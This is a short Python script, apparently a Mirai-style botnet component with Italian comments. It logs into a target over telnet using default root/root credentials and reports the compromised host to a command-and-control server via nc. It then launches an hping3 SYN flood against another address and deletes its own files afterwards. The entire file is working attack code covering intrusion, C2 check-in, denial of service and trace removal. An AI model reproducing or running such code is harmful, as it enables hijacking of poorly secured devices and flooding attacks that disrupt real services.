import os
from sys import argv
import socket
import telnetlib
import subprocess
import time

def main():

    numLine = int(argv[1])
    count = 0
    fileIpAlive = "IPalive.txt"
    
    file = open(fileIpAlive, "r+")

    Lines = file.readlines()

    for line in Lines:
        HOST = line.strip()
        if (count==numLine):
            count = 0
            break
        count += 1

    print(HOST)
    file.close()
    numLine = numLine +1
    
    PORTtoOpen = 4000
    fileNameToSend = "pyscript.py"
    user = "root"
    password = "root"

    
    tn = telnetlib.Telnet(HOST,23)
    tn.read_until(b"login: ")
    tn.write(user.encode('ascii') + b"\n")

    if password:
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
    
    stringToSend = '"' + HOST +'\\n"'
    commandToSend = 'echo -e -n ' + stringToSend +' | nc -w 2 172.16.0.3 1025'                 #IP del cnc 172.16.0.3, impostare IP statico

    commandHack = " hping3 -S --flood -V -p 80 172.18.0.4"

    tn.write(commandToSend.encode('ascii') +b"\n")
    time.sleep(2)
    
    subprocess.call(commandHack, shell=True)                        #Effettuo l'attacco
    tn.close()

    #Elimino i files dal sistema 
    os.remove("IPalive.txt")
    os.remove("pyscript.py")


    
    

if __name__ == "__main__":
    main()
